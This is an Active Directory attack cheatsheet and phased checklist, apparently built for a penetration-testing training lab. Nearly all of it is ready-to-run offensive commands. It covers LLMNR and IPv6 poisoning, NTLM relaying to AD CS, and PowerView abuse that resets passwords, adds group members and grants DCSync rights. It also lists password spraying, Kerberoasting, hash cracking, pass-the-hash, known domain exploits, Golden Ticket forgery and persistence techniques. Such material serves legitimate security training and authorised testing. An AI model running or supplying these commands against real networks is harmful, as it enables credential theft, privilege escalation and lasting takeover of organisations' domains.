## Cheatsheet

### Hashcat Modes for AD
```
5600    NetNTLMv2 (Responder captures)
13100   Kerberoast TGS (RC4)
19700   Kerberoast TGS (AES256)
18200   AS-REP Roast (RC4)
1000    NTLM
```

### Responder — LLMNR/NBT-NS Poisoning
```bash
sudo responder -I eth0 -A                       # passive / analyze mode
sudo responder -I eth0 -w -d                    # active with WPAD, poison DHCPv6
sudo responder -I eth0 -wrf --lm                # aggressive — downgrade & LM
# Logs & hashes: /usr/share/responder/logs/
# Config: /usr/share/responder/Responder.conf   # disable SMB/HTTP before relay
```

```bash

# Relay to LDAP — dump info

sudo ntlmrelayx.py -t http://CA01/certsrv/certfnsh.asp --adcs --template DomainController
# IPv6 poisoning
sudo mitm6 -d inlanefreight.local
```

### PowerView — enumeration
```powershell
Import-Module .\PowerView.ps1
Get-Domain ; Get-DomainController ; Get-DomainPolicy

Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainComputer -Properties name,operatingsystem,msds-allowedtodelegateto
Get-DomainComputer -Unconstrained ; Get-DomainComputer -TrustedToAuth
Get-DomainTrust ; Get-DomainTrustMapping ; Get-ForestTrust

Find-InterestingDomainShareFile -Include *passwd*,*cred*,*.config
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

### PowerView — abuse
```powershell
# Force change password
Set-DomainUserPassword -Identity victim -AccountPassword $pw -Credential $Cred
# Add to group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members victim -Credential $Cred
# Set fake SPN -> targeted Kerberoast
Set-DomainObject -Identity adunn -SET @{serviceprincipalname='fake/LEGIT'} -Credential $Cred
# Clear SPN after roast

# Grant yourself DCSync via WriteDacl
Add-DomainObjectAcl -TargetIdentity 'DC=inlanefreight,DC=local' -PrincipalIdentity you -Rights DCSync
```

### BloodHound Queries (Cypher)
```cypher
// Who is Kerberoastable?
MATCH (u:User {hasspn:true}) RETURN u.name
// Who is AS-REP Roastable?
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
// CanPSRemote path from current user
MATCH p=shortestPath((u:User {owned:true})-[:MemberOf|CanPSRemote*1..]->(c:Computer)) RETURN p
// Shortest path to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@X"})) RETURN p
// Unconstrained delegation hosts
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
// DCSync principals
MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN u.name
```

## Checklist

### Phase 1 — External Recon (no creds)
- [ ] ASN/IP space (ARIN, RIPE, BGP Toolkit)
- [ ] DNS records, subdomain enum
- [ ] GitHub / S3 / Azure blob for leaks
- [ ] HaveIBeenPwned + Dehashed for cleartext creds
- [ ] LinkedIn → `linkedin2username` → user wordlist
- [ ] Identify email naming convention

### Phase 2 — Unauth Internal
- [ ] Passive sniff — `tcpdump`, `responder -A`
- [ ] Host sweep — `fping -asgq`, `nmap -sV -sC`
- [ ] Identify DC — port 88/389/445
- [ ] AD-DNS dump — `adidnsdump`
- [ ] SMB null session — `rpcclient -U "" -N`
- [ ] LDAP anonymous bind — `ldapsearch -x`
- [ ] Kerbrute userenum against DC
- [ ] enum4linux-ng -A
- [ ] windapsearch anonymous

### Phase 3 — Poisoning
- [ ] Responder (SMB+HTTP enabled)
- [ ] Inveigh from Windows foothold
- [ ] mitm6 if IPv6 enabled
- [ ] SMB signing check — relay if disabled
- [ ] Crack NTLMv2 hashes (`-m 5600`)

### Phase 4 — Password Policy & User List
- [ ] Policy: `getdompwinfo` / `net accounts` / `Get-DomainPolicy` / `--pass-pol`
- [ ] Note lockout threshold + observation window
- [ ] User list via rpcclient, ldapsearch, kerbrute, lookupsid RID brute
- [ ] Filter out accounts near lockout (`badpwdcount`)

### Phase 5 — Password Spraying
- [ ] Choose password (Season+Year, Welcome1, Company123)
- [ ] One attempt, wait for observation window, repeat
- [ ] Kerbrute / netexec / DomainPasswordSpray
- [ ] Try `--local-auth` with recovered local-admin hashes
- [ ] Validate hits with netexec

### Phase 6 — Security Controls (on foothold)
- [ ] `Get-MpComputerStatus` (Defender)
- [ ] `Get-AppLockerPolicy -Effective`
- [ ] `$ExecutionContext.SessionState.LanguageMode`
- [ ] `netsh advfirewall show allprofiles`
- [ ] `qwinsta` — am I alone?
- [ ] LAPS delegation enum

### Phase 7 — Credentialed Enum (Linux)
- [ ] netexec `--users --groups --shares --loggedon-users --pass-pol`
- [ ] smbmap for shares + spider
- [ ] ldapsearch bound queries (admins, SPNs, pre-auth)
- [ ] windapsearch `--da --PU`
- [ ] bloodhound-python `-c all`

### Phase 8 — Credentialed Enum (Windows)
- [ ] systeminfo + ipconfig + route print
- [ ] `Get-ADDomain` + `Get-ADTrust`
- [ ] PowerView: users, groups, computers, SPNs, trusts
- [ ] SharpHound `-c all`
- [ ] Snaffler for share secrets
- [ ] PingCastle healthcheck

### Phase 9 — Kerberoasting / AS-REP
- [ ] `Get-DomainUser -SPN` / `GetUserSPNs.py -request`
- [ ] Rubeus `kerberoast /stats` → `/ldapfilter:'admincount=1'`
- [ ] Check `msds-supportedencryptiontypes` → RC4 vs AES
- [ ] `/tgtdeleg` if AES-only (<Server 2019)
- [ ] `Get-DomainUser -PreauthNotRequired` → `GetNPUsers.py -no-pass`
- [ ] Crack: `hashcat -m 13100 / -m 18200 / -m 19700`

### Phase 10 — ACL / DCSync
- [ ] BloodHound edges: ForceChangePassword, GenericAll, GenericWrite, WriteDACL, WriteOwner, AddSelf, AllExtendedRights, ReadLAPSPassword
- [ ] Targeted enum: `Get-DomainObjectACL -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}`
- [ ] Chain abuse via `Set-DomainUserPassword` / `Add-DomainGroupMember` / `Set-DomainObject` (SPN)
- [ ] WriteDacl on domain root → grant self DCSync → secretsdump
- [ ] Shadow credentials via `Whisker` / `pywhisker`

### Phase 11 — Bleeding-Edge Quick Wins
- [ ] NoPac (CVE-2021-42278/42287) scanner
- [ ] PrintNightmare (CVE-2021-34527) — spooler check
- [ ] PetitPotam (CVE-2021-36942) + AD CS relay → ESC8

### Phase 12 — Misconfigurations
- [ ] Description field passwords
- [ ] PASSWD_NOTREQD accounts
- [ ] SYSVOL logon scripts
- [ ] GPP cpassword (`-M gpp_autologin`)
- [ ] Exchange / Account Operators abuses
- [ ] Editable GPO (`SharpGPOAbuse`)

### Phase 13 — Lateral Movement
- [ ] CanRDP / CanPSRemote / SQLAdmin enum (BloodHound)
- [ ] Pass-the-Hash with psexec/wmiexec
- [ ] Pass-the-Ticket (Rubeus ptt / KRB5CCNAME)
- [ ] Overpass-the-Hash → request TGT
- [ ] xp_cmdshell → SeImpersonate → SYSTEM
- [ ] Double-hop: use `-Credential` or `Register-PSSessionConfiguration`

### Phase 14 — Trust Enumeration & Attack
- [ ] `Get-DomainTrust` / `Get-DomainTrustMapping` / `netdom trust`
- [ ] BloodHound "Map Domain Trusts"
- [ ] Child→Parent: DCSync child krbtgt → forge Golden with parent EA SID in `/sids`
- [ ] Cross-forest: Kerberoast across trust, foreign group members, SID history
- [ ] Verify with real auth attempt

### Phase 15 — Domain Dominance & Persistence
- [ ] DCSync krbtgt → Golden Ticket
- [ ] Silver Ticket per service
- [ ] AdminSDHolder ACL persistence
- [ ] DSRM admin
